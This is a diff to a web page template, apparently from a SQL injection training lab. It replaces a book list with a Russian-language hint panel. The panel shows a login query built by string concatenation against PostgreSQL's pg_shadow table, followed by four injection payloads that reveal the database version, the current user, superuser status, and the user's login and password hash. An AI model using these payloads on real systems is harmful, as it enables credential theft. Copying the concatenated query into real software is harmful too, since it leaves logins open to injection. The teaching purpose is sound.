@@ -37,14 +37,29 @@
 </p>
 <div class="collapse" id="collapseExample">
   <div class="card card-body">
-    {% for book in books %}
-        <div class='book'>
-            <h3>#{{ book[0] }} - {{ book[1] }} BY {{ book[2] }}</h3>
-            <i><p>({{ book[3] }} pages)</p></i>
-            <p class='review'>{{ book[4] }}</p>
-            <i><p>Added {{ book[5] }}</p></i>
+        <div>
+            <h3>На сервере выполняется следующий запрос к БД:</h3>
+            <p class='review'>SELECT EXISTS (SELECT * FROM pg_shadow WHERE usename = '" + login + "' AND passwd = '" + full_hash + "');</p>
         </div>
-    {% endfor %}
+        <div>
+            <h3>1. Узнать версию БД</h3>
+            <i><p>Используется закрытие ковычек и комментарий в конце</p></i>
+            <p class='review'>123')||(SELECT version());--</p>
+            <i><p>Для объединения запросов используется ||</p></i>
+        </div>
+        <div>
+            <h3>2. Узнать текущего пользователя БД</h3>
+            <p class='review'>123')||(SELECT current_user);--</p>
+        </div>
+        <div>
+            <h3>3. Является ли текущий пользователь суперпользователем</h3>
+            <p class='review'>123')||(SHOW is_superuser);--</p>
+        </div>
+        <div>
+            <h3>4. Получить логин и хэш пароля</h3>
+            <p class='review'>123')||(SELECT usename, passwd FROM pg_shadow WHERE usename = current_user);--</p>
+            <i><p>Системная таблица pg_shadow хранит логины и хэши паролей</p></i>
+        </div>
   </div>
 </div>
 </div>
